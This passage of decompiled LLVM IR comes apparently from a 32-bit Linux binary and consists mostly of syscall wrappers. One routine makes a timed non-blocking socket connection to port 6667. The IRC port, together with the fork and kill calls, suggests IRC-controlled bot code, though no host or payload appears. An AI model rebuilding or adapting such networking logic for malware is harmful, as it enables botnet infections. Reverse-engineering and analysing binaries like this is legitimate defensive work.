  br i1 %v1_804aeba, label %dec_label_pc_804aed0, label %dec_label_pc_804aebe

dec_label_pc_804aebe:                             ; preds = %dec_label_pc_804aead
  %v0_804aebe = load i32, i32* @global_var_8058d80.59, align 128
  store i32 %v0_804aebe, i32* %stack_var_-60, align 4
  %v1_804aec6 = call i32 @function_804d880(i32 %v0_804aebe)
  %v10_804aecb = icmp eq i32 %v1_804aec6, -1
  %v1_804aece = icmp eq i1 %v10_804aecb, false
  br i1 %v1_804aece, label %dec_label_pc_804af2a, label %dec_label_pc_804aed0

dec_label_pc_804aed0:                             ; preds = %dec_label_pc_804aebe, %dec_label_pc_804aead
  %v0_804aed0 = load i32, i32* @global_var_8058d80.59, align 128
  store i32 %v0_804aed0, i32* %stack_var_-60, align 4
  %v1_804aed8 = call i32 @function_804d8a8(i32 %v0_804aed0)
  %v4_804aee0 = icmp eq i32 %v1_804aed8, 0
  %v1_804aee4 = icmp eq i1 %v4_804aee0, false
  br i1 %v1_804aee4, label %dec_label_pc_804af02, label %dec_label_pc_804aee6

dec_label_pc_804aee6:                             ; preds = %dec_label_pc_804aed0
  store i32 0, i32* @global_var_8058d80.59, align 128
  %v0_804aef0 = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804aef0, i32* %stack_var_-60, align 4
  %v1_804aef8 = call i32 @function_804b7d8(i32 %v0_804aef0)
  br label %dec_label_pc_804ae3c.backedge

dec_label_pc_804ae3c.backedge:                    ; preds = %dec_label_pc_804aee6, %dec_label_pc_804b085
  br label %dec_label_pc_804ae3c

dec_label_pc_804af02:                             ; preds = %dec_label_pc_804aed0
  %v1_804af05 = add i32 %v1_804aed8, 12
  %v2_804af05 = inttoptr i32 %v1_804af05 to i32*
  %v3_804af05 = load i32, i32* %v2_804af05, align 4
  %v1_804af13 = add i32 %v1_804aed8, 16
  %v2_804af13 = inttoptr i32 %v1_804af13 to i32*
  %v3_804af13 = load i32, i32* %v2_804af13, align 4
  %v1_804af16 = inttoptr i32 %v3_804af13 to i32*
  %v2_804af16 = load i32, i32* %v1_804af16, align 4
  store i32 %v2_804af16, i32* %stack_var_-60, align 4
  %v3_804af23 = call i32 @function_804d644(i32 %v2_804af16, i32 %v2_804af0d, i32 %v3_804af05)
  br label %dec_label_pc_804af3a

dec_label_pc_804af2a:                             ; preds = %dec_label_pc_804aebe
  %v0_804af2a = load i32, i32* @global_var_8058d80.59, align 128
  store i32 %v0_804af2a, i32* %stack_var_-60, align 4
  %v1_804af32 = call i32 @function_804d880(i32 %v0_804af2a)
  store i32 %v1_804af32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804af3a

dec_label_pc_804af3a:                             ; preds = %dec_label_pc_804af02, %dec_label_pc_804af2a
  store i32 2, i32* %stack_var_-32, align 4
  store i32 6667, i32* %stack_var_-60, align 4
  %v2_804af47 = call i32 @function_804d778(i16 6667)
  %v0_804af53 = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804af53, i32* %stack_var_-60, align 4
  %v3_804af6b = call i32 @function_804b94c(i32 %v0_804af53, i32 21537, i32 %v2_804af59)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804af77 = call i32 @function_804ba00(i32* null)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804b07416 = call i32 @function_804ba00(i32* null)
  %v5_804b07917 = sub i32 %v2_804b07416, %v2_804af77
  %tmp = icmp ult i32 %v5_804b07917, 10
  br i1 %tmp, label %dec_label_pc_804af84, label %dec_label_pc_804b085

dec_label_pc_804af84:                             ; preds = %dec_label_pc_804af3a, %dec_label_pc_804b061
  %v1_804af84 = call i32 @function_804baa4(i32 %v2_804af77)
  %v1_804af89 = inttoptr i32 %v1_804af84 to i32*
  store i32 0, i32* %v1_804af89, align 4
  %v0_804af92 = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804af92, i32* %stack_var_-60, align 4
  %v3_804afa7 = call i32 @function_804dc64(i32 %v0_804af92, i32 %v2_804af0a, i32 16)
  %v1_804afac = icmp eq i32 %v3_804afa7, 0
  br i1 %v1_804afac, label %dec_label_pc_804afc0, label %dec_label_pc_804afb0

dec_label_pc_804afb0:                             ; preds = %dec_label_pc_804af84
  %v0_804afb0 = load i32, i32* %stack_var_-60, align 4
  %v1_804afb0 = call i32 @function_804baa4(i32 %v0_804afb0)
  %v1_804afb5 = inttoptr i32 %v1_804afb0 to i32*
  %v2_804afb5 = load i32, i32* %v1_804afb5, align 4
  %v9_804afb7 = icmp eq i32 %v2_804afb5, 106
  %v1_804afba = icmp eq i1 %v9_804afb7, false
  br i1 %v1_804afba, label %dec_label_pc_804b049, label %dec_label_pc_804afc0

dec_label_pc_804afc0:                             ; preds = %dec_label_pc_804afb0, %dec_label_pc_804af84
  %v0_804afc0 = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804afc0, i32* %stack_var_-60, align 4
  %v5_804afe8 = call i32 @function_804dd2c(i32 %v0_804afc0, i32 1, i32 13, i32 0, i32 0)
  %v0_804afed = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804afed, i32* %stack_var_-60, align 4
  %v5_804b015 = call i32 @function_804dd2c(i32 %v0_804afed, i32 1, i32 2, i32 0, i32 0)
  %v0_804b01a = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804b01a, i32* %stack_var_-60, align 4
  %v5_804b042 = call i32 @function_804dd2c(i32 %v0_804b01a, i32 1, i32 9, i32 0, i32 0)
  ret i32 %v5_804b042

dec_label_pc_804b049:                             ; preds = %dec_label_pc_804afb0
  %v0_804b049 = load i32, i32* %stack_var_-60, align 4
  %v1_804b049 = call i32 @function_804baa4(i32 %v0_804b049)
  %v1_804b04e = inttoptr i32 %v1_804b049 to i32*
  %v2_804b04e = load i32, i32* %v1_804b04e, align 4
  %v9_804b050 = icmp eq i32 %v2_804b04e, 115
  br i1 %v9_804b050, label %dec_label_pc_804b061, label %dec_label_pc_804b055

dec_label_pc_804b055:                             ; preds = %dec_label_pc_804b049
  %v0_804b055 = load i32, i32* %stack_var_-60, align 4
  %v1_804b055 = call i32 @function_804baa4(i32 %v0_804b055)
  %v1_804b05a = inttoptr i32 %v1_804b055 to i32*
  %v2_804b05a = load i32, i32* %v1_804b05a, align 4
  %v9_804b05c = icmp eq i32 %v2_804b05a, 114
  %v1_804b05f = icmp eq i1 %v9_804b05c, false
  br i1 %v1_804b05f, label %dec_label_pc_804b085, label %dec_label_pc_804b061

dec_label_pc_804b061:                             ; preds = %dec_label_pc_804b055, %dec_label_pc_804b049
  store i32 1, i32* %stack_var_-60, align 4
  %v1_804b068 = call i32 @function_804f348(i32 1)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804b074 = call i32 @function_804ba00(i32* null)
  %v5_804b079 = sub i32 %v2_804b074, %v2_804af77
  %tmp23 = icmp ult i32 %v5_804b079, 10
  br i1 %tmp23, label %dec_label_pc_804af84, label %dec_label_pc_804b085

dec_label_pc_804b085:                             ; preds = %dec_label_pc_804b061, %dec_label_pc_804b055, %dec_label_pc_804af3a
  store i32 0, i32* @global_var_8058d80.59, align 128
  %v0_804b08f = load i32, i32* @global_var_8058c68.7, align 8
  store i32 %v0_804b08f, i32* %stack_var_-60, align 4
  %v1_804b097 = call i32 @function_804b7d8(i32 %v0_804b08f)
  br label %dec_label_pc_804ae3c.backedge

; uselistorder directives
  uselistorder i32 %v2_804af77, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 4, 5, 6, 2, 1, 7, 8, 9, 3, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804dd2c, { 2, 1, 0 }
  uselistorder i32 (i32*)* @function_804ba00, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @function_804d644, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804d8a8, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804ed9c, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804af84, { 1, 0 }
  uselistorder label %dec_label_pc_804af3a, { 1, 0 }
  uselistorder label %dec_label_pc_804ae3c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804ae79, { 1, 0 }
}

define i32 @function_804b7d8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b7d8:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b7d8 = load i32, i32* @edi, align 4
  store i32 %v0_804b7d8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b7e0 = load i32, i32* @ebx, align 4
  %v1_804b7e8 = call i32 @close(i32 %arg1)
  store i32 %v0_804b7e0, i32* @ebx, align 4
  store i32 %v1_804b7e8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b7e8, -4095
  br i1 %tmp, label %dec_label_pc_804b800, label %dec_label_pc_804b7f4

dec_label_pc_804b7f4:                             ; preds = %dec_label_pc_804b7d8
  %v1_804b7f4 = call i32 @function_804baa4(i32 %v0_804b7e0)
  %v0_804b7f9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b7f9 = sub i32 0, %v0_804b7f9
  %v2_804b7fb = inttoptr i32 %v1_804b7f4 to i32*
  store i32 %v1_804b7f9, i32* %v2_804b7fb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b800

dec_label_pc_804b800:                             ; preds = %dec_label_pc_804b7d8, %dec_label_pc_804b7f4
  %v0_804b801 = phi i32 [ %v1_804b7e8, %dec_label_pc_804b7d8 ], [ -1, %dec_label_pc_804b7f4 ]
  %v2_804b804 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b804, i32* @edi, align 4
  ret i32 %v0_804b801

; uselistorder directives
  uselistorder i32 %v1_804b7e8, { 1, 0, 2 }
  uselistorder i32 %v0_804b7e0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b800, { 1, 0 }
}

define i32 @function_804b808() local_unnamed_addr {
dec_label_pc_804b808:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b808 = load i32, i32* @ebx, align 4
  store i32 %v0_804b808, i32* %stack_var_-4, align 4
  %v1_804b811 = call i32 @fork(i32 %v0_804b808)
  store i32 %v1_804b811, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b811, -4095
  br i1 %tmp, label %dec_label_pc_804b828, label %dec_label_pc_804b81c

dec_label_pc_804b81c:                             ; preds = %dec_label_pc_804b808
  %v0_804b81c = load i32, i32* %stack_var_-4, align 4
  %v1_804b81c = call i32 @function_804baa4(i32 %v0_804b81c)
  %v0_804b821 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b821 = sub i32 0, %v0_804b821
  %v2_804b823 = inttoptr i32 %v1_804b81c to i32*
  store i32 %v1_804b821, i32* %v2_804b823, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b828

dec_label_pc_804b828:                             ; preds = %dec_label_pc_804b808, %dec_label_pc_804b81c
  %v0_804b829 = phi i32 [ %v1_804b811, %dec_label_pc_804b808 ], [ -1, %dec_label_pc_804b81c ]
  %v2_804b82c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b82c, i32* @ebx, align 4
  ret i32 %v0_804b829

; uselistorder directives
  uselistorder i32 %v1_804b811, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b828, { 1, 0 }
}

define i32 @function_804b8e8() local_unnamed_addr {
dec_label_pc_804b8e8:
  %v0_804b8e8 = load i32, i32* @global_var_8058b10.102, align 16
  store i32 %v0_804b8e8, i32* @edx, align 4
  %v1_804b8f3 = icmp eq i32 %v0_804b8e8, 0
  %v1_804b8f5 = icmp eq i1 %v1_804b8f3, false
  %v4_804b8f5 = select i1 %v1_804b8f5, i32 %v0_804b8e8, i32 4096
  ret i32 %v4_804b8f5
}

define i32 @function_804b8fc() local_unnamed_addr {
dec_label_pc_804b8fc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b8fc = load i32, i32* @ebx, align 4
  store i32 %v0_804b8fc, i32* %stack_var_-4, align 4
  %v1_804b905 = call i32 @getpid(i32 %v0_804b8fc)
  store i32 %v1_804b905, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b905, -4095
  br i1 %tmp, label %dec_label_pc_804b91c, label %dec_label_pc_804b910

dec_label_pc_804b910:                             ; preds = %dec_label_pc_804b8fc
  %v0_804b910 = load i32, i32* %stack_var_-4, align 4
  %v1_804b910 = call i32 @function_804baa4(i32 %v0_804b910)
  %v0_804b915 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b915 = sub i32 0, %v0_804b915
  %v2_804b917 = inttoptr i32 %v1_804b910 to i32*
  store i32 %v1_804b915, i32* %v2_804b917, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b91c

dec_label_pc_804b91c:                             ; preds = %dec_label_pc_804b8fc, %dec_label_pc_804b910
  %v0_804b91d = phi i32 [ %v1_804b905, %dec_label_pc_804b8fc ], [ -1, %dec_label_pc_804b910 ]
  %v2_804b920 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b920, i32* @ebx, align 4
  ret i32 %v0_804b91d

; uselistorder directives
  uselistorder i32 %v1_804b905, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b91c, { 1, 0 }
}

define i32 @function_804b94c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b94c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b94c = load i32, i32* @edi, align 4
  store i32 %v0_804b94c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804b964 = load i32, i32* @ebx, align 4
  %v2_804b96c = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_804b964, i32* @ebx, align 4
  store i32 %v2_804b96c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804b96c, -4095
  br i1 %tmp, label %dec_label_pc_804b984, label %dec_label_pc_804b978

dec_label_pc_804b978:                             ; preds = %dec_label_pc_804b94c
  %v1_804b978 = call i32 @function_804baa4(i32 %v0_804b964)
  %v0_804b97d = load i32, i32* %edi.global-to-local, align 4
  %v1_804b97d = sub i32 0, %v0_804b97d
  %v2_804b97f = inttoptr i32 %v1_804b978 to i32*
  store i32 %v1_804b97d, i32* %v2_804b97f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b984

dec_label_pc_804b984:                             ; preds = %dec_label_pc_804b94c, %dec_label_pc_804b978
  %v0_804b987 = phi i32 [ %v2_804b96c, %dec_label_pc_804b94c ], [ -1, %dec_label_pc_804b978 ]
  %v2_804b989 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b989, i32* @edi, align 4
  ret i32 %v0_804b987

; uselistorder directives
  uselistorder i32 %v2_804b96c, { 1, 0, 2 }
  uselistorder i32 %v0_804b964, { 1, 0 }
  uselistorder label %dec_label_pc_804b984, { 1, 0 }
}

define i32 @function_804b98c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b98c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b98c = load i32, i32* @ebx, align 4
  store i32 %v0_804b98c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804b99f = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804b99f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804b99f, -4095
  br i1 %tmp, label %dec_label_pc_804b9b8, label %dec_label_pc_804b9ac

dec_label_pc_804b9ac:                             ; preds = %dec_label_pc_804b98c
  %v0_804b9ac = load i32, i32* %stack_var_-4, align 4
  %v1_804b9ac = call i32 @function_804baa4(i32 %v0_804b9ac)
  %v0_804b9b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b9b1 = sub i32 0, %v0_804b9b1
  %v2_804b9b3 = inttoptr i32 %v1_804b9ac to i32*
  store i32 %v1_804b9b1, i32* %v2_804b9b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b9b8

dec_label_pc_804b9b8:                             ; preds = %dec_label_pc_804b98c, %dec_label_pc_804b9ac
  %v0_804b9b9 = phi i32 [ %v2_804b99f, %dec_label_pc_804b98c ], [ -1, %dec_label_pc_804b9ac ]
  %v2_804b9b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b9b8, i32* @edx, align 4
  %v2_804b9bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b9bc, i32* @ebx, align 4
  ret i32 %v0_804b9b9

; uselistorder directives
  uselistorder i32 %v2_804b99f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b9b8, { 1, 0 }
}

define i32 @function_804b9c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804b9c0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b9c1 = load i32, i32* @esi, align 4
  store i32 %v0_804b9c1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b9d9 = load i32, i32* @ebx, align 4
  %v1_804b9e1 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804b9d9, i32* @ebx, align 4
  store i32 %v1_804b9e1, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b9e1, -4095
  br i1 %tmp, label %dec_label_pc_804b9f9, label %dec_label_pc_804b9ed

dec_label_pc_804b9ed:                             ; preds = %dec_label_pc_804b9c0
  %v1_804b9ed = call i32 @function_804baa4(i32 %v0_804b9d9)
  %v0_804b9f2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b9f2 = sub i32 0, %v0_804b9f2
  %v2_804b9f4 = inttoptr i32 %v1_804b9ed to i32*
  store i32 %v1_804b9f2, i32* %v2_804b9f4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b9f9

dec_label_pc_804b9f9:                             ; preds = %dec_label_pc_804b9c0, %dec_label_pc_804b9ed
  %v0_804b9fa = phi i32 [ %v1_804b9e1, %dec_label_pc_804b9c0 ], [ -1, %dec_label_pc_804b9ed ]
  %v2_804b9fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b9fc, i32* @esi, align 4
  ret i32 %v0_804b9fa

; uselistorder directives
  uselistorder i32 %v1_804b9e1, { 1, 0, 2 }
  uselistorder i32 %v0_804b9d9, { 1, 0 }
  uselistorder label %dec_label_pc_804b9f9, { 1, 0 }
}

define i32 @function_804ba00(i32* %arg1) local_unnamed_addr {
dec_label_pc_804ba00:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba00 = load i32, i32* @edi, align 4
  store i32 %v0_804ba00, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804ba08 = load i32, i32* @ebx, align 4
  %v2_804ba10 = call i32 @time(i32* %arg1)
  store i32 %v0_804ba08, i32* @ebx, align 4
  store i32 %v2_804ba10, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804ba10, -4095
  br i1 %tmp, label %dec_label_pc_804ba28, label %dec_label_pc_804ba1c

dec_label_pc_804ba1c:                             ; preds = %dec_label_pc_804ba00
  %v1_804ba1c = call i32 @function_804baa4(i32 %v0_804ba08)
  %v0_804ba21 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ba21 = sub i32 0, %v0_804ba21
  %v2_804ba23 = inttoptr i32 %v1_804ba1c to i32*
  store i32 %v1_804ba21, i32* %v2_804ba23, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ba28

dec_label_pc_804ba28:                             ; preds = %dec_label_pc_804ba00, %dec_label_pc_804ba1c
  %v0_804ba29 = phi i32 [ %v2_804ba10, %dec_label_pc_804ba00 ], [ -1, %dec_label_pc_804ba1c ]
  %v2_804ba2c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba2c, i32* @edi, align 4
  ret i32 %v0_804ba29

; uselistorder directives
  uselistorder i32 %v2_804ba10, { 1, 0, 2 }
  uselistorder i32 %v0_804ba08, { 1, 0 }
  uselistorder label %dec_label_pc_804ba28, { 1, 0 }
}

define i32 @function_804ba30(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ba30:
  %v5_804ba41 = call i32 @function_804fe60(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_804ba41
}

define i32 @function_804ba4c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ba4c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba4c = load i32, i32* @edi, align 4
  store i32 %v0_804ba4c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804ba5c = load i32, i32* @ebx, align 4
  %v4_804ba64 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804ba5c, i32* @ebx, align 4
  store i32 %v4_804ba64, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804ba64, -4095
  br i1 %tmp, label %dec_label_pc_804ba7c, label %dec_label_pc_804ba70

dec_label_pc_804ba70:                             ; preds = %dec_label_pc_804ba4c
  %v1_804ba70 = call i32 @function_804baa4(i32 %v0_804ba5c)
  %v0_804ba75 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ba75 = sub i32 0, %v0_804ba75
  %v2_804ba77 = inttoptr i32 %v1_804ba70 to i32*
  store i32 %v1_804ba75, i32* %v2_804ba77, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ba7c

dec_label_pc_804ba7c:                             ; preds = %dec_label_pc_804ba4c, %dec_label_pc_804ba70
  %v0_804ba7d = phi i32 [ %v4_804ba64, %dec_label_pc_804ba4c ], [ -1, %dec_label_pc_804ba70 ]
  %v2_804ba7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ba7c, i32* @edx, align 4
  %v2_804ba80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba80, i32* @edi, align 4
  ret i32 %v0_804ba7d

; uselistorder directives
  uselistorder i32 %v4_804ba64, { 1, 0, 2 }
  uselistorder i32 %v0_804ba5c, { 1, 0 }
  uselistorder label %dec_label_pc_804ba7c, { 1, 0 }
}

define i32 @function_804ba84(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ba84:
  %v1_804ba88 = add i32 %arg1, 128
  %v6_804ba93 = icmp ugt i32 %v1_804ba88, 383
  br i1 %v6_804ba93, label %dec_label_pc_804ba9e, label %dec_label_pc_804ba95

dec_label_pc_804ba95:                             ; preds = %dec_label_pc_804ba84
  %v0_804ba95 = load i32, i32* inttoptr (i32 134570468 to i32*), align 4
  %v2_804ba9a = mul i32 %arg1, 2
  %v3_804ba9a = add i32 %v0_804ba95, %v2_804ba9a
  %v4_804ba9a = inttoptr i32 %v3_804ba9a to i16*
  %v5_804ba9a = load i16, i16* %v4_804ba9a, align 2
  %v6_804ba9a = sext i16 %v5_804ba9a to i32
  br label %dec_label_pc_804ba9e

dec_label_pc_804ba9e:                             ; preds = %dec_label_pc_804ba84, %dec_label_pc_804ba95
  %v0_804ba9e = phi i32 [ %arg1, %dec_label_pc_804ba84 ], [ %v6_804ba9a, %dec_label_pc_804ba95 ]
  ret i32 %v0_804ba9e

; uselistorder directives
  uselistorder label %dec_label_pc_804ba9e, { 1, 0 }
}

define i32 @function_804baa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804baa4:
  ret i32 ptrtoint (i32* @global_var_8058b20.107 to i32)
}

define i32 @function_804baac(i16* %arg1) local_unnamed_addr {
dec_label_pc_804baac:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804baac = load i32, i32* @ebp, align 4
  %v0_804baad = load i32, i32* @edi, align 4
  %v0_804baae = load i32, i32* @esi, align 4
  %v0_804baaf = load i32, i32* @ebx, align 4
  %v4_804bab3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804bab3, i32* @esi, align 4
  %v1_804bab7 = add i32 %v4_804bab3, 52
  %v2_804bab7 = inttoptr i32 %v1_804bab7 to i32*
  %v3_804bab7 = load i32, i32* %v2_804bab7, align 4
  store i32 %v3_804bab7, i32* @ebp, align 4
  %v1_804baba = icmp eq i32 %v3_804bab7, 0
  %v1_804babc = icmp eq i1 %v1_804baba, false
  br i1 %v1_804babc, label %dec_label_pc_804badd, label %dec_label_pc_804babe

dec_label_pc_804babe:                             ; preds = %dec_label_pc_804baac
  %v1_804babe = add i32 %v4_804bab3, 56
  store i32 %v1_804babe, i32* @ebx, align 4
  %v2_804bac8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bac8, i32* @eax, align 4
  %v2_804bacd = call i32 @function_804f65e(i32 %v2_804bac8, i32 134542939)
  %v0_804bad2 = load i32, i32* @ebx, align 4
  %v1_804bad5 = call i32 @function_804f65b(i32 %v0_804bad2)
  store i32 %v1_804bad5, i32* @eax, align 4
  %v0_804badf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804badd

dec_label_pc_804badd:                             ; preds = %dec_label_pc_804baac, %dec_label_pc_804babe
  %v0_804bae7 = phi i32 [ %v4_804bab3, %dec_label_pc_804baac ], [ %v0_804badf.pre, %dec_label_pc_804babe ]
  store i32 0, i32* @edi, align 4
  %v1_804badf = inttoptr i32 %v0_804bae7 to i8*
  %v2_804badf = load i8, i8* %v1_804badf, align 1
  %v3_804badf = and i8 %v2_804badf, 64
  %v4_804badf = icmp eq i8 %v3_804badf, 0
  br i1 %v4_804badf, label %dec_label_pc_804badd.dec_label_pc_804baf2_crit_edge, label %dec_label_pc_804bae4

dec_label_pc_804badd.dec_label_pc_804baf2_crit_edge: ; preds = %dec_label_pc_804badd
  br label %dec_label_pc_804baf2

dec_label_pc_804bae4:                             ; preds = %dec_label_pc_804badd
  %v1_804bae8 = inttoptr i32 %v0_804bae7 to i16*
  %v2_804bae8 = call i32 @function_804d194(i16* %v1_804bae8)
  store i32 %v2_804bae8, i32* @edi, align 4
  %v0_804baf5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804baf2

dec_label_pc_804baf2:                             ; preds = %dec_label_pc_804badd.dec_label_pc_804baf2_crit_edge, %dec_label_pc_804bae4
  %v0_804baf5 = phi i32 [ %v0_804bae7, %dec_label_pc_804badd.dec_label_pc_804baf2_crit_edge ], [ %v0_804baf5.pre, %dec_label_pc_804bae4 ]
  %v1_804baf5 = add i32 %v0_804baf5, 4
  %v2_804baf5 = inttoptr i32 %v1_804baf5 to i32*
  %v3_804baf5 = load i32, i32* %v2_804baf5, align 4
  %v1_804baf8 = call i32 @function_804b7d8(i32 %v3_804baf5)
  %v0_804bb00 = load i32, i32* @esi, align 4
  %v1_804bb00 = add i32 %v0_804bb00, 4
  %v2_804bb00 = inttoptr i32 %v1_804bb00 to i32*
  store i32 -1, i32* %v2_804bb00, align 4
  %v2_804bb11 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804bb11, i32* @ebx, align 4
  %v2_804bb16 = icmp slt i32 %v1_804baf8, 0
  store i32 -1, i32* @eax, align 4
  %v1_804bb1d = load i32, i32* @edi, align 4
  %v3_804bb1d = select i1 %v2_804bb16, i32 -1, i32 %v1_804bb1d
  store i32 %v3_804bb1d, i32* @edi, align 4
  %v2_804bb20 = call i32 @function_804f65e(i32 %v2_804bb11, i32 134542939)
  %v1_804bb2c = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056218.108 to i32))
  %v0_804bb31 = load i32, i32* @global_var_80568e0.109, align 32
  %v1_804bb36 = add i32 %v0_804bb31, 1
  store i32 %v1_804bb36, i32* @global_var_80568e0.109, align 32
  store i32 ptrtoint (i32* @global_var_8056218.108 to i32), i32* @eax, align 4
  %v2_804bb41 = call i32 @function_804f65e(i32 %v2_804bb11, i32 1)
  %v0_804bb46 = load i32, i32* @esi, align 4
  %v1_804bb46 = inttoptr i32 %v0_804bb46 to i32*
  %v2_804bb46 = load i32, i32* %v1_804bb46, align 4
  %v1_804bb4b = and i32 %v2_804bb46, 24576
  %v1_804bb50 = or i32 %v1_804bb4b, 48
  store i32 %v1_804bb50, i32* @eax, align 4
  %v1_804bb55 = trunc i32 %v1_804bb50 to i16
  %v3_804bb55 = inttoptr i32 %v0_804bb46 to i16*
  store i16 %v1_804bb55, i16* %v3_804bb55, align 2
  br i1 %v1_804babc, label %dec_label_pc_804bb6b, label %dec_label_pc_804bb5a

